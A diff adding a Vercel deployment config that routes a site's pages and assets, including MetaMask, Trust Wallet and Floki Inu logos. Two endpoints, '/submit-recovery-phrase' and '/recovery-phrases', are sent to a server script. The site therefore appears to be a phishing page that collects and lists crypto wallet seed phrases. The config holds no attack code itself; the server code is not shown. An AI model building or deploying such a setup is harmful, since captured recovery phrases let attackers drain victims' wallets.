@@ -1,0 +1,59 @@
+{
+  "version": 2,
+  "builds": [
+    {
+      "src": "server.js",
+      "use": "@vercel/node"
+    },
+    {
+      "src": "index.html",
+      "use": "@vercel/static"
+    },
+    {
+      "src": "styles.css",
+      "use": "@vercel/static"
+    },
+    {
+      "src": "misc/**/*",
+      "use": "@vercel/static"
+    }
+  ],
+  "routes": [
+    {
+      "src": "/",
+      "dest": "/index.html"
+    },
+    {
+      "src": "/styles.css",
+      "dest": "/styles.css"
+    },
+    {
+      "src": "/misc/metamask.jpg",
+      "dest": "/misc/metamask.jpg"
+    },
+    {
+      "src": "/misc/GOquKoWWoAEPecp.jpg",
+      "dest": "/misc/GOquKoWWoAEPecp.jpg"
+    },
+    {
+      "src": "/misc/floki-inu-floki-logo.png",
+      "dest": "/misc/floki-inu-floki-logo.png"
+    },
+    {
+      "src": "/misc/trustwalletlogo.png",
+      "dest": "/misc/trustwalletlogo.png"
+    },
+    {
+      "src": "/misc/tv-ad.mp4",
+      "dest": "/misc/tv-ad.mp4"
+    },
+    {
+      "src": "/submit-recovery-phrase",
+      "dest": "/server.js"
+    },
+    {
+      "src": "/recovery-phrases",
+      "dest": "/server.js"
+    }
+  ]
+}
